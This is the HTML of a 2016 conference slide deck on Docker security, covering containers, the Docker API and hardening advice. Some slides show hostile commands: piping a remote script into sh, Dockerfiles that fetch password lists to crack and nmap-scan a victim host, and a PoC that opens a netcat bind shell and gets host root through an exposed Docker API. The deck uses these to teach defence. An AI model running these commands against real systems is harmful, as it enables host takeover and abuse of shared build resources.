@@ -1,0 +1,633 @@
+<!doctype html>
+<html lang="en">
+
+	<head>
+		<meta charset="utf-8">
+
+		<title>Docker Security</title>
+
+		<meta name="description" content="Docker Security">
+		<meta name="author" content="VK">
+
+		<meta name="apple-mobile-web-app-capable" content="yes" />
+		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+
+		<link rel="stylesheet" href="css/reveal.css">
+		<link rel="stylesheet" href="css/theme/diverto.css" id="theme">
+
+		<!-- Code syntax highlighting -->
+		<link rel="stylesheet" href="lib/css/zenburn.css">
+
+		<!-- Printing and PDF exports -->
+		<script>
+			var link = document.createElement( 'link' );
+			link.rel = 'stylesheet';
+			link.type = 'text/css';
+			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+			document.getElementsByTagName( 'head' )[0].appendChild( link );
+		</script>
+
+		<!--[if lt IE 9]>
+		<script src="lib/js/html5shiv.js"></script>
+		<![endif]-->
+	</head>
+
+	<body>
+
+		<div class="reveal">
+
+			<!-- Any section element inside of this container is displayed as a slide -->
+                        <div class="slides">
+                                <section>
+                                        <img src="images/diverto-logo.png" border="0">
+                                        <h1>Docker Security</h1>
+                                        <h3>Is it secure enough for me?</h3>
+                                        <h3></h3>
+                                        <p>
+                                                <small>Vlatko Kosturjak (<a href="https://twitter.com/k0st">@k0st</a>), <a href="https://2016.dorscluc.org/">DORS/CLUC 2016, Zagreb, 11th of May, 2016</a></small>
+                                        </p>
+                                </section>
+
+                                <section>
+                                        <h2>Agenda</h2>
+                                        <ul>
+                                                <li>Introduction</li>
+						<li>Application containers and Docker</li>
+                                                <li>How to use them</li>
+						<li>Docker API</li>
+						<li>Docker security</li>
+						<li>Recommendations</li>
+						<li>Summary</li>
+						<li>Questions and answers</li>
+                                        </ul>
+                                        <p align="right">30 minutes</p>
+                                        <aside class="notes">
+                                                This is what we will cover in this presentation.
+                                        </aside>
+                                </section>
+
+				<section>
+					<section>
+						<h2>About me</h2>
+						<ul>
+							<li>Security Consultant in Diverto</li>
+							<li>Open source (security) developer</li>
+							<ul>
+								<li>Have code in OpenVAS, Nmap, Metasploit, ...</li>
+								<li><a href="https://github.com/kost">https://github.com/kost</a></li>
+							</ul>
+							<li>Securing DevOps</li>
+							<ul>
+								<li>Helping clients in DevOps security</li>
+							</ul>
+							<li>DORS/CLUC and HULK</li>
+							<ul>
+								<li>was president of CLUG/HULK</li>
+								<li>was part of organizing comittee of DORS/CLUC 2016</li>
+							</ul>
+						</ul>
+					</section>
+
+
+				</section>
+
+				<section>
+					<h2>Application Containers</h2>
+					<ul>
+						<li>"Virtualization" on application level</li>
+						<li>Same kernel</li>
+						<ul>
+							<li>Several application</li>
+						</ul>
+						<li>Advantages</li>
+						<ul>
+							<li>Better resource utilization</li>
+							<li>Isolation</li>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Docker Hosting</h2>
+					<ul>
+						<li>Google</li>
+						<ul>
+							<li><a href="https://cloud.google.com/container-engine/">https://cloud.google.com/container-engine/</a></li>
+						</ul>
+						<li>Amazon</li>
+						<ul>
+							<li><a href="https://aws.amazon.com/documentation/ecs/">https://aws.amazon.com/documentation/ecs/</a></li>
+						</ul>
+						<li>Tutum</li>
+						<ul>
+							<li><a href="https://www.tutum.co/">https://www.tutum.co/</a></li>
+						</ul>
+						<li>Other</li>
+						<ul>
+							<li>sloppy.io, stackdock.com, orchardup.com, ...
+						</ul>
+						
+					</ul>
+				</section>
+
+				<section>
+					<h2>Docker</h2>
+					<ul>
+						<li>"chroot on steroids"</li>
+						<li>application containers</li>
+						<li>layer "above LXC" (actually libcontainer)</li>
+						<ul>
+							<li>same kernel</li>
+							<li>Control Groups (cgroups) and namespaces</li>
+							<li>own network stack and process space</li>
+						</ul>
+						<li>Written mostly in Go</li>
+						<li>References</li>
+						<ul>
+							<li><a href="https://www.docker.com/">https://www.docker.com/</a></li>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Docker basic</h2>
+					<ul>
+						<li>containers</li>
+						<ul>
+							<li>instances of images</li>
+							<li>you can have multiple containers with same or different image</li>
+							<li>Analogies</li>
+							<ul>
+								<li>programmer: think of object</li>
+								<li>Amazon: similar to EC2 (EC2 vs AMI)</li>
+							</ul>
+						</ul>
+						<li>images</li>
+						<ul>
+							<li>images are basis for creating containers</li>
+							<li>Analogies</li>
+							<ul>
+								<li>programmer: think of classes</li>
+								<li>Same as AMIs in Amazon context</li>
+							</ul>
+							<li>can have multiple tags</li>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Common docker commands</h2>
+					<table>
+						<thead>
+							<tr>
+								<th>Command</th>
+								<th>Description</th>
+							</tr>
+						</thead>
+						<tbody>
+							<tr>
+								<td>docker ps</td>
+								<td>list running containers</td>
+							</tr>
+							<tr>
+								<td>docker ps -as</td>
+								<td>list ALL containers with size</td>
+							</tr>
+							<tr>
+								<td>docker images</td>
+								<td>list local images</td>
+							</tr>
+							<tr>
+								<td>docker search [term]</td>
+								<td>search remote central repo for image</td>
+							</tr>
+							<tr>
+								<td>docker run [imagename]</td>
+								<td>creates container from [imagename]</td>
+							</tr>
+							<tr>
+								<td>docker start [cont]</td>
+								<td>starts already created container</td>
+							</tr>
+							<tr>
+								<td>docker stop [cont]</td>
+								<td>stops started container</td>
+							</tr>
+						</tbody>
+					</table>
+				</section>
+
+				<section>
+					<h2>Docker security</h2>
+					<ul>
+						<li>Dependencies</li>
+						<ul>
+							<li>Physical security</li>
+							<li>Hardware</li>
+							<li>Host Operating system (drivers included)</li>
+							<li>Docker itself &amp; components</li>
+							<li>Images and containers</li>
+							<li>Application itself &amp; components</li>
+							<li>People</li>
+							<li>Organization</li>
+						</ul>
+						<li>The hardest part</li>
+						<ul>
+							<li>It needs only one item to fail</li>
+						</ul>	
+					</ul>
+				</section>
+
+				<section>
+					<h2>Two ways building</h2>
+					<ul>
+						<li>Dockerfile</li>
+						<ul>
+						<pre><code data-trim contenteditable>	
+FROM debian:latest
+RUN apt-get update &amp;&amp; apt-get install mysql-server
+						</code></pre>
+						</ul>
+						<li>Manual with commands</li>
+						<ul>
+						<pre><code data-trim contenteditable>	
+docker commit
+docker diffs
+						</code></pre>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Common problem</h2>
+					<ul>
+						<li>If you have to use something like this</li>
+						<ul>
+						<pre><code data-trim contenteditable>	
+FROM debian:latest
+RUN wget http://some.really.cool.app/install.sh -O - | sh
+						</code></pre>
+						</ul>
+						<li>Try to use https instead</li>
+						<ul>
+						<pre><code data-trim contenteditable>	
+FROM debian:latest
+RUN wget https://some.really.cool.app/install.sh -O - | sh
+						</code></pre>
+						</ul>
+					</ul>
+				</section>
+
+				<section
+					<h2>Docker building abuse</h2>
+					<img src="images/docker-building-limits.png">
+					<ul>
+					<ul>
+						<li>Limits</li>
+						<ul>
+							<li>2 hours</li>
+							<li>2 GB RAM</li>
+							<li>1 CPU</li>
+							<li>30 GB disk space</li>
+						</ul>
+						<li>How you will define this?</li>
+						<ul>
+							<li>Free Computing Resources</li>
+						</ul>	
+					</ul>
+				</section>
+
+				<section>
+					<h2>Docker building abuse</h2>
+					<ul>
+						<li>Cracking passwords</li>
+						<ul>
+						<pre><code data-trim contenteditable>	
+FROM debian:latest
+RUN apt-get update &amp;&amp; apt-get install john
+RUN wget http://rawpastebin.com/bXXXXXX -O /tmp/passwords
+RUN john /tmp/passwords
+						</code></pre>
+						</ul>
+						<li>Scanning:)</li>
+						<ul>
+						<pre><code data-trim contenteditable>	
+FROM debian:latest
+RUN apt-get update &amp;&amp; apt-get install nmap 
+RUN nmap -sT -V -O -p- victim.com 
+						</code></pre>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Docker security</h2>
+					<ul>
+						<li>Comes with reasonable security settings</li>
+						<ul>
+							<li>container with reduced number of capabilities</li>
+							<li>docker control socket/API only on UNIX socket</li>
+							<li>grsec/PAX compatible</li>
+							<li>SELinux/Apparmor compatible</li>
+						</ul>
+						<li>Example</li>
+						<ul>
+							<li>You need service to listen on port below 1024</li>
+							<li>just give net_bind_service capabilities</li>
+						</ul>	
+					</ul>
+				</section>
+
+				<section>
+					<h2>Docker user namespaces</h2>
+					<ul>
+						<li>own user namespace missing</li>
+						<ul>
+							<li>UID 31337 in container = UID 31337 on host</li>
+							<li>UID 0 in container = UID 0 on host</li>
+							<li>to be implemented in 1.9!?</li>
+						</ul>
+						<li><a href="https://s3hh.wordpress.com/2013/07/19/creating-and-using-containers-without-privilege/">https://s3hh.wordpress.com/2013/07/19/creating-and-using-containers-without-privilege/</a></li>
+						<li>References</li>
+						<ul>
+							<li><a href="https://github.com/docker/docker/issues/7906">https://github.com/docker/docker/issues/7906</a></li>
+							<li><a href="https://github.com/docker/docker/pull/12648">https://github.com/docker/docker/pull/12648</a></li>
+							<li><a href="https://github.com/docker/docker/issues/15187">https://github.com/docker/docker/issues/15187</a></li>
+						</ul>	
+					</ul>
+				</section>
+
+				<section>
+					<h2>Docker API</h2>
+					<ul>
+						<li>Docker control is done through</li>
+						<ul>
+							<li>UNIX socket (by default)</li>
+							<li>TCP server</li>
+							<li>HTTP server (REST API)</li>
+						</ul>
+						<li>Expose it and you're owned</li>
+						<ul>
+							<li>GUI frontends and parameter tampering</li>
+							<li>Not just containers, but host as well</li>
+							<li>docker_get_host_shell.rb PoC</li>
+						</ul>
+						<li>References</li>
+						<ul>
+							<li><a href="https://gist.github.com/kost/e2e35337cac3ba59a6d3">https://gist.github.com/kost/e2e35337cac3ba59a6d3</a></li>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>docker_get_host_shell.rb Example</h2>
+						<pre><code data-trim contenteditable>	
+$ ./docker_get_host_shell.rb -p 31337
+W, [2015-09-12T03:15:50.224295 #11995]  WARN -- : Container IP address: 172.17.0.97
+W, [2015-09-12T03:15:50.224832 #11995]  WARN -- : Executing shell: nc -e /bin/sh -lvp 31337
+						</code></pre>
+						<pre><code data-trim contenteditable>	
+$ nc -vv 172.17.0.97 31337
+(UNKNOWN) [172.17.0.97] 31337 (?) open
+id
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys)
+						</code></pre>
+					<ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>docker_get_host_shell.rb</h2>
+					<pre><code data-trim contenteditable>
+id
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys)
+docker version
+Client:
+ Version:      1.8.1
+ API version:  1.20
+ Go version:   go1.4.2
+ Git commit:   d12ea79
+ Built:        Thu Aug 13 02:28:37 UTC 2015
+ OS/Arch:      linux/amd64
+
+Server:
+ Version:      1.8.1
+ API version:  1.20
+ Go version:   go1.4.2
+ Git commit:   d12ea79
+ Built:        Thu Aug 13 02:28:37 UTC 2015
+ OS/Arch:      linux/amd64
+					</code></pre>
+				</section>
+
+				<section>
+					<h2>Docker API Recommendations</h2>
+					<ul>
+						<li>Do not expose Docker API over network</li>
+						<li>If you still have to</li>
+						<ul>
+							<li>Use VPN</li>
+							<li>Use TLS certificates</li>
+						</ul>
+						<li>In short</li>
+						<ul>
+							<li>only trusted users should be allowed to control your Docker daemon</li>
+						<ul>
+						<li>References</li>
+						<ul>
+							<li><a href="https://docs.docker.com/articles/security/">https://docs.docker.com/articles/security/</a></li>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Docker recommendations</h2>
+					<ul>
+						<li>General</li>
+						<ul>
+							<li>same security profile/level on same docker host</li>
+							<li>take a look at CIS Docker benchmarks</li>
+							<li>define limits</li>
+						</ul>
+						<li>Networking</li>
+						<ul>
+							<li>icc=false</li>
+							<li>net=host can reboot your host</li>
+							<li>Expose only needed ports in Dockerfile</li>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Docker Images recommendations</h2>
+					<ul>
+						<li>General</li>
+						<ul>
+							<li>Base your images on trusted images</li>
+							<li>USER directive is your friend</li>
+						</ul>
+						<li>Smaller image is smaller exposure</li>
+						<ul>
+							<li>Don't install packages you <b>might</b> need</li>
+							<li>Don't build with SSH daemon</li>
+							<li>Don't build all images from ubuntu images</li>
+							<ul>
+								<li>Check <a href="http://imagelayers.io">imagelayers.io</a></li>
+								<li><a href="https://imagelayers.io/?images=ubuntu:latest,debian:latest,alpine:latest">ImageLayers Comparison</a></li>
+								<li>Consider Debian and Alpine</li>
+							</ul>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Alpine Linux and Docker</h2>
+					<ul>
+						<li>security-oriented</li>
+						<li>lightweight Linux distribution</li>
+						<li>based on musl libc and busybox</li>
+							<blockquote>
+&ldquo;...For example, I think Alpine Linux may be a good distro to contribute to.
+Surely there are others... &rdquo; -Solar Designer
+							</blockquote>
+						<li><a href="https://marc.info/?l=owl-users&m=141991034310376&w=2">https://marc.info/?l=owl-users&m=141991034310376&w=2</a></li>
+						<li>Examples</li>
+						<ul>
+							<li><a href="https://github.com/kost/docker-alpine">https://github.com/kost/docker-alpine</a></li>
+							<li><a href="https://github.com/kost/docker-security">https://github.com/kost/docker-security</a></li>
+						</ul>
+					</ul>
+				</section>
+
+
+				<section>
+					<h2>Docker example</h2>
+					<ul>
+						<li><a href="https://k0st.wordpress.com/2015/06/18/using-bloom-filter-for-hash-database/">https://k0st.wordpress.com/2015/06/18/using-bloom-filter-for-hash-database/</a></li>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Alpine Linux, but...</h2>
+					<ul>
+						<img src="images/docker-alpine-issue.png" />
+						<li>References</li>
+						<ul>
+							<li><a href="https://github.com/gliderlabs/docker-alpine/issues/101">Alpine Docker image security issue</a></li>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>dockscan</h2>
+					<ul>
+						<img src="images/dockscan-github.png" />
+						<li>References</li>
+						<ul>
+							<li><a href="https://github.com/kost/dockscan">https://github.com/kost/dockscan</a></li>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>dockscan</h2>
+					<ul>
+						<li>Features</li>
+						<ul>
+							<li>plugin based system for discovery, audit and reporting</li>
+							<li>able to scan local and remote docker installations</li>
+							<li>plugins are easy to write</li>
+						</ul>
+						<li>Requirements</li>
+						<ul>
+							<li>Ruby</li>
+							<li>docker-api gem</li>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>dockscan alternatives</h2>
+					<ul>
+						<li>dockbench</li>
+						<ul>
+							<li><a href="https://github.com/docker/docker-bench-security">https://github.com/docker/docker-bench-security</a></li>
+						</ul>
+						<li>Docker Security Scanning</li>
+						<ul>
+							<li>ex. Project Nautilus</li>
+							<li><a href="https://blog.docker.com/2016/05/docker-security-scanning/">https://blog.docker.com/2016/05/docker-security-scanning/</a></li>
+						</ul>
+						<li>OpenSCAP compliance</li>
+						<ul>
+							<li><a href="https://github.com/OpenSCAP/container-compliance">https://github.com/OpenSCAP/container-compliance</a></li>
+						</ul>
+						<li>CoreOS Clair</li>
+						<ul>
+							<li><a href="https://github.com/coreos/clair">https://github.com/coreos/clair</a></li>
+						</ul>
+					</ul>
+				</section>
+
+
+				<section>
+					<h2>Summary</h2>
+					<ul>
+						<li>Application containers will not vanish</li>
+						<ul>
+							<li>Growing business</li>
+							<li>Growing technology</li>
+						</ul>
+						<li>You have two paths</li>
+						<ul>
+							<li>Hate and rant</li>
+							<li>Help and make it secure</li>
+						</ul>
+					</ul>
+				</section>
+
+
+		                 <section>
+                                        <h3>Thanks on listening</h3>
+                                        <h1>?</h1>
+                                        <h3>Any questions?</h3>
+					<h3><a href="https://twitter.com/k0st">@k0st</a></h3>
+                                </section>
+
+			</div>
+
+		</div>
+
+		<script src="lib/js/head.min.js"></script>
+		<script src="js/reveal.js"></script>
+
+		<script>
+
+			// Full list of configuration options available at:
+			// https://github.com/hakimel/reveal.js#configuration
+			Reveal.initialize({
+				controls: true,
+				progress: true,
+				history: true,
+				center: true,
+				slideNumber: true,
+
+				transition: 'slide', // none/fade/slide/convex/concave/zoom
+
+				// Optional reveal.js plugins
+				dependencies: [
+					{ src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
+					{ src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/highlight/highlight.js', async: true, condition: function() { return !!document.querySelector( 'pre code' ); }, callback: function() { hljs.initHighlightingOnLoad(); } },
+					{ src: 'plugin/zoom-js/zoom.js', async: true },
+					{ src: 'plugin/notes/notes.js', async: true }
+				]
+			});
+
+		</script>
+
+	</body>
+</html>
